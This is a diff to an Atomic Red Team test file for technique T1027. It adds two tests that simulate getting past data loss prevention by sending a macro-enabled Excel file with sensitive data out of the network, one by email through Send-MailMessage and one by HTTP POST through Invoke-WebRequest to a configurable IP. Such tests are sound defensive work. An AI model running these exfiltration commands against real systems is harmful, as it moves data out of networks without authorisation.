@@ -101,3 +101,59 @@ atomic_tests:
       del /Q "%temp%\T1027.zip" >nul 2>nul
     name: command_prompt
 
+- name: DLP Evasion via Sensitive Data in VBA Macro over email
+  auto_generated_guid:
+  description: |
+    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file: 
+      description: url to download XLSM file
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/src/T1027-cc-macro.xlsm
+    sender:
+      description: sender email
+      type: string
+      default: test@corp.com
+    receiver:
+      description: receiver email
+      type: string
+      default: test@corp.com
+    smtp_server:
+      description: SMTP Server IP Address
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1027-cc-macro.xlsm must exist on disk.
+  executor:
+    command: |
+      "Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1027 Atomic Test" -Attachments PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm -SmtpServer #{smtp_server}"
+    name: command_prompt
+
+- name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
+  auto_generated_guid:
+  description: |
+    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file: 
+      description: url to download XLSM file
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/src/T1027-cc-macro.xlsm
+    ip_address:
+      description: Destination IP address
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1027-cc-macro.xlsm must exist on disk.
+  executor:
+    command: |
+      $content = Get-Content #{input_file} 
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
+    name: command_prompt
